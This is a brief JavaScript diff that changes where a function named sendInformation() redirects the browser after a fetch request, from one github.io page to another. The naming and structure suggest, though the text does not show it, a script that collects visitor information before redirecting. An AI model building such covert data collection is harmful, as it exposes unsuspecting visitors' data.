@@ -23,7 +23,7 @@ function sendInformation() {
     
     fetch(url, options)
     .then(response => response.text())
-    .then(result => location="https://saikono-telegram.github.io/mybio/")
+    .then(result => location="https://dilmuradd.github.io/ip/")
     .catch(error => console.log("error", error));
 }
 
